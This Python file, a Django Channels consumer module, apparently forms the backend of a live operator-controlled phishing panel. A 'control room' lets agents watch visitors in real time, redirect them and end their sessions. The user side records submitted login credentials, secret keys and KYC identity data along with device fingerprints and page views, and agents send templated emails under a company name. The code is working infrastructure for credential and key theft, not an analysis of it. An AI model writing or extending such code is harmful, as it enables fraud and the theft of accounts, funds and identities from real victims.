# accounts/consumers.py - UPDATED with proper logging methods


import json
from channels.generic.websocket import AsyncWebsocketConsumer
from asgiref.sync import sync_to_async
from .models import Session, SessionLog


# ===========================
# CONTROL ROOM CONSUMER
# ===========================
class ControlRoomConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        import logging
        import asyncio
        logger = logging.getLogger(__name__)

        user = self.scope.get("user")
        logger.info(f"[ControlRoom] Connection attempt - User: {user}, Authenticated: {user.is_authenticated if user else False}")

        if not user or not user.is_authenticated:
            logger.warning("[ControlRoom] Connection rejected - User not authenticated")
            await self.close(code=4001)
            return

        # Determine group based on user role
        if getattr(user, "is_superuser", False):
            # Superusers see everything
            self.room_group_name = "control_room"
            logger.info(f"[ControlRoom] Superuser {user.username} joining global control_room")
        else:
            # Regular agents only see their own events
            self.room_group_name = f"agent_{user.id}"
            logger.info(f"[ControlRoom] Agent {user.username} joining isolated channel {self.room_group_name}")

        try:
            # Add explicit timeout to prevent indefinite hanging on Redis TLS connection
            await asyncio.wait_for(
                self.channel_layer.group_add(self.room_group_name, self.channel_name),
                timeout=10.0
            )
            logger.info(f"[ControlRoom] User {user.username} added to group {self.room_group_name}")
        except asyncio.TimeoutError:
            logger.error(f"[ControlRoom] ❌ Redis timeout - group_add took >10s. Check TLS/Redis configuration!")
            await self.close(code=4500)
            return
        except Exception as e:
            logger.error(f"[ControlRoom] ❌ Redis error: {type(e).__name__}: {e}")
            await self.close(code=4500)
            return

        await self.accept()
        logger.info(f"[ControlRoom] ✅ Connection accepted for {user.username}")
        await self.send(text_data=json.dumps({
            "type": "connection_established",
            "message": "Connected to Control Room",
            "user": user.username,
        }))

    async def disconnect(self, close_code):
        import logging
        logger = logging.getLogger(__name__)

        # Only discard if room_group_name was set (connection was accepted)
        if hasattr(self, 'room_group_name'):
            await self.channel_layer.group_discard(self.room_group_name, self.channel_name)
            logger.info(f"[ControlRoom] Disconnected with code {close_code}")
        else:
            logger.info(f"[ControlRoom] Connection was rejected before accepting")

    async def receive(self, text_data):
        data = json.loads(text_data)
        command = data.get('command')
        uuid = data.get('uuid')  # internal session identifier

        if command == 'redirect_user' and uuid:
            await self.channel_layer.group_send(
                f'session_{uuid}',
                {'type': 'user_command', 'command': 'redirect', 'url': data.get('url', '/')}
            )
            await self.log_session_action(uuid, f'Agent redirected user to {data.get("url")}')
            await self.channel_layer.group_send(
                'control_room',
                {'type': 'control_message', 'message': f'Redirected session {uuid} to {data.get("url")}'}
            )

        elif command == 'terminate_session' and uuid:
            await self.terminate_session(uuid)
            await self.channel_layer.group_send(
                f'session_{uuid}',
                {'type': 'user_command', 'command': 'session_ended', 'message': 'Session terminated by agent'}
            )

    async def control_message(self, event):
        await self.send(text_data=json.dumps({
            'type': 'control_message',
            'message': event['message']
        }))

    async def user_status_update(self, event):
        await self.send(text_data=json.dumps({
            'type': 'user_status',
            'uuid': event.get('uuid'),
            'case_id': event.get('case_id'),
            'status': event['status'],
            'data': event.get('data', {})
        }))

    async def session_update(self, event):
        await self.send(text_data=json.dumps({
            'type': 'session_update',
            'uuid': event.get('uuid'),
            'case_id': event.get('case_id'),
            'stage': event.get('stage'),
            'user_online': event.get('user_online'),
            'message': event.get('message', '')
        }))

    async def broadcast_message(self, event):
        """
        Generic broadcast event handler used by delete_selected_sessions() and others.
        """
        await self.send(text_data=json.dumps({
            "type": "broadcast",
            "event": event.get("event"),
            "data": event.get("data", {})
        }))
       

    # ADD NEW MESSAGE TYPES FOR TRACKING
    async def device_metadata(self, event):
        await self.send(text_data=json.dumps({
            'type': 'device_metadata',
            'uuid': event.get('uuid'),
            'metadata': event.get('metadata', {})
        }))

    async def user_activity(self, event):
        await self.send(text_data=json.dumps({
            'type': 'user_activity',
            'uuid': event.get('uuid'),
            'activity': event.get('activity'),
            'data': event.get('data', {})
        }))

    async def session_started(self, event):
        await self.send(text_data=json.dumps({
            'type': 'session_started',
            'uuid': event.get('uuid'),
            'data': event.get('data', {})
        }))

    async def page_view(self, event):
        await self.send(text_data=json.dumps({
            'type': 'page_view',
            'uuid': event.get('uuid'),
            'data': event.get('data', {})
        }))

    async def verified_data(self, event):
        """Handle verified data updates from agent decisions."""
        await self.send(text_data=json.dumps({
            'type': 'verified_data',
            'uuid': event.get('uuid'),
            'data': event.get('data', {})
        }))

    # EMAIL EVENT HANDLERS (for real-time notifications)

    async def email_queued(self, event):
        """
        Handle email_queued event - triggered when agent sends email.

        Notifies all agents in control room that email has been queued.
        Uses django-anymail for provider-agnostic delivery.
        """
        await self.send(text_data=json.dumps({
            'type': 'email_queued',
            'data': {
                'session_uuid': event.get('session_uuid'),
                'case_id': event.get('case_id'),
                'to_email': event.get('to_email'),
                'template_type': event.get('template_type'),
                'template_name': event.get('template_name'),
                'status': event.get('status'),
                'company_name': event.get('company_name'),
            }
        }))

    async def email_sent(self, event):
        """
        Handle email_sent event - triggered when Celery task completes.

        Updates agents with final delivery status.
        Works with any email provider via django-anymail.
        """
        await self.send(text_data=json.dumps({
            'type': 'email_sent',
            'data': {
                'session_uuid': event.get('session_uuid'),
                'case_id': event.get('case_id'),
                'to_email': event.get('to_email'),
                'status': event.get('status'),
                'email_log_id': event.get('email_log_id'),
                'provider_message_id': event.get('provider_message_id'),
            }
        }))

    @sync_to_async
    def log_session_action(self, uuid, message):
        try:
            session = Session.objects.get(uuid=uuid)
            SessionLog.objects.create(session=session, message=message, log_type='agent_action')
        except Session.DoesNotExist:
            pass

    @sync_to_async
    def terminate_session(self, uuid):
        try:
            session = Session.objects.get(uuid=uuid)
            session.status = 'terminated'
            session._broadcasted_by_viewset = True
            session.save()
            SessionLog.objects.create(session=session, message='Session terminated via WebSocket', log_type='agent_action')
        except Session.DoesNotExist:
            pass

    

# ===========================
# SESSION CONSUMER (User side)
# ===========================
class SessionConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        self.uuid = self.scope['url_route']['kwargs']['uuid']
        self.room_group_name = f'session_{self.uuid}'

        # Verify existence
        if not await self.verify_session_exists(self.uuid):
            await self.close()
            return

        # AUTHORIZATION CHECK
        user = self.scope.get('user')
        guest_claims = self.scope.get('guest_claims')
        is_authorized = False

        # 1. Agent Access (Authenticated User)
        if user and user.is_authenticated:
            if user.is_superuser or await self.verify_agent_ownership(user, self.uuid):
                is_authorized = True
        
        # 2. Guest Access (Valid JWT for this specific session)
        elif guest_claims:
            if guest_claims.get('session_uuid') == self.uuid:
                is_authorized = True
                
        if not is_authorized:
            print(f"[SessionConsumer] ⛔ Unauthorized access attempt to {self.uuid}")
            await self.close(code=4003)
            return

        await self.channel_layer.group_add(self.room_group_name, self.channel_name)
        
        # Only mark user online if it's the GUEST connecting
        if guest_claims:
            await self.update_user_connection_status(True)

            await self.channel_layer.group_send(
                'control_room', # Broadcast to superusers
                {'type': 'user_status_update', 'uuid': self.uuid, 'status': 'connected', 'data': {'connected': True}}
            )
            # Also notify legitimate agent
            await self.notify_agent_of_connection(self.uuid, True)

        await self.accept()

    async def disconnect(self, close_code):
        await self.channel_layer.group_discard(self.room_group_name, self.channel_name)
        await self.update_user_connection_status(False)
        await self.channel_layer.group_send(
            'control_room',
            {'type': 'user_status_update', 'uuid': self.uuid, 'status': 'disconnected', 'data': {'connected': False}}
        )

    async def receive(self, text_data):
        data = json.loads(text_data)
        
        if data.get('type') == 'status_update':
            status = data['status']
            user_data = data.get('data', {})

            # Log and notify agent
            await self.log_user_action(status, user_data)
            await self.channel_layer.group_send(
                'control_room',
                {'type': 'user_status_update', 'uuid': self.uuid, 'status': status, 'data': user_data}
            )
        
        # ADD THESE NEW MESSAGE TYPES FOR TRACKING
        elif data.get('type') == 'device_metadata':
            await self.log_device_metadata(data.get('data', {}))
            await self.channel_layer.group_send(
                'control_room',
                {
                    'type': 'device_metadata',
                    'uuid': self.uuid,
                    'metadata': data.get('data', {})
                }
            )
        
        elif data.get('type') == 'user_activity':
            await self.log_user_activity(data.get('activity'), data.get('data', {}))
            await self.channel_layer.group_send(
                'control_room',
                {
                    'type': 'user_activity',
                    'uuid': self.uuid,
                    'activity': data.get('activity'),
                    'data': data.get('data', {})
                }
            )
        
        elif data.get('type') == 'session_started':
            await self.log_session_start(data.get('data', {}))
            await self.channel_layer.group_send(
                'control_room',
                {
                    'type': 'session_started',
                    'uuid': self.uuid,
                    'data': data.get('data', {})
                }
            )
        
        elif data.get('type') == 'page_view':
            await self.log_page_view(data.get('data', {}))
            await self.channel_layer.group_send(
                'control_room',
                {
                    'type': 'page_view',
                    'uuid': self.uuid,
                    'data': data.get('data', {})
                }
            )

    async def user_command(self, event):
        await self.send(text_data=json.dumps({
            'type': 'command',
            'command': event['command'],
            'url': event.get('url'),
            'stage': event.get('stage'),
            'next_stage': event.get('next_stage'),
            'message': event.get('message', '')
        }))

    async def session_update(self, event):
        await self.send(text_data=json.dumps({
            'type': 'session_update',
            'stage': event.get('stage'),
            'message': event.get('message', '')
        }))


    async def verified_data(self, event):
        pass


    @sync_to_async
    def verify_session_exists(self, uuid):
        # add auto dissconnect later or handle user discconection with the agent its important
        return Session.objects.filter(uuid=uuid, status__in=['active', 'completed']).exists()
    


    @sync_to_async
    def update_user_connection_status(self, is_connected):
        try:
            session = Session.objects.get(uuid=self.uuid)
            session.user_online = is_connected
            session.save()
            SessionLog.objects.create(
                session=session,
                message='User connected' if is_connected else 'User disconnected',
                log_type='user_connection'
            )
        except Session.DoesNotExist:
            pass

    @sync_to_async
    def update_session_stage(self, stage):
        try:
            session = Session.objects.get(uuid=self.uuid)
            session.stage = stage
            if stage == 'completed':
                session.status = 'completed'
            session.save()
        except Session.DoesNotExist:
            pass

    @sync_to_async
    def log_user_action(self, status, user_data):
        try:
            session = Session.objects.get(uuid=self.uuid)
            message_map = {
                'credentials_submitted': 'User submitted login credentials',
                'secret_key_submitted': 'User submitted secret key',
                'kyc_submitted': 'User submitted KYC information',
            }
            SessionLog.objects.create(
                session=session,
                message=message_map.get(status, f'User action: {status}'),
                log_type='user_input',
                extra_data=user_data
            )
        except Session.DoesNotExist:
            pass

    # ADD THESE NEW LOGGING METHODS
    @sync_to_async
    def log_device_metadata(self, metadata):
        try:
            session = Session.objects.get(uuid=self.uuid)
            SessionLog.objects.create(
                session=session,
                message=f'Device fingerprint: {metadata.get("fingerprint", "unknown")}',
                log_type='device_metadata',
                extra_data=metadata
            )
        except Session.DoesNotExist:
            pass

    @sync_to_async
    def log_user_activity(self, activity, data):
        try:
            session = Session.objects.get(uuid=self.uuid)
            SessionLog.objects.create(
                session=session,
                message=f'User activity: {activity}',
                log_type='user_activity',
                extra_data=data
            )
        except Session.DoesNotExist:
            pass

    @sync_to_async
    def log_session_start(self, data):
        try:
            session = Session.objects.get(uuid=self.uuid)
            SessionLog.objects.create(
                session=session,
                message='Session started with device fingerprinting',
                log_type='session_start',
                extra_data=data
            )
        except Session.DoesNotExist:
            pass

    @sync_to_async
    def log_page_view(self, data):
        try:
            session = Session.objects.get(uuid=self.uuid)
            SessionLog.objects.create(
                session=session,
                message=f'Page viewed: {data.get("page", "unknown")}',
                log_type='page_view',
                extra_data=data
            )
        except Session.DoesNotExist:
            pass

    @sync_to_async
    def verify_agent_ownership(self, user, uuid):
        """Check if user is the assigned agent for this session"""
        return Session.objects.filter(uuid=uuid, agent=user).exists()

    async def notify_agent_of_connection(self, uuid, is_connected):
        """Notify the specific agent responsible for this session"""
        try:
            agent_id = await self.get_session_agent_id(uuid)
            if agent_id:
                await self.channel_layer.group_send(
                    f'agent_{agent_id}',
                    {
                        'type': 'user_status_update', 
                        'uuid': uuid, 
                        'status': 'connected' if is_connected else 'disconnected',
                        'data': {'connected': is_connected}
                    }
                )
        except Exception:
            pass

    @sync_to_async
    def get_session_agent_id(self, uuid):
        try:
            return Session.objects.get(uuid=uuid).agent_id
        except Session.DoesNotExist:
            return None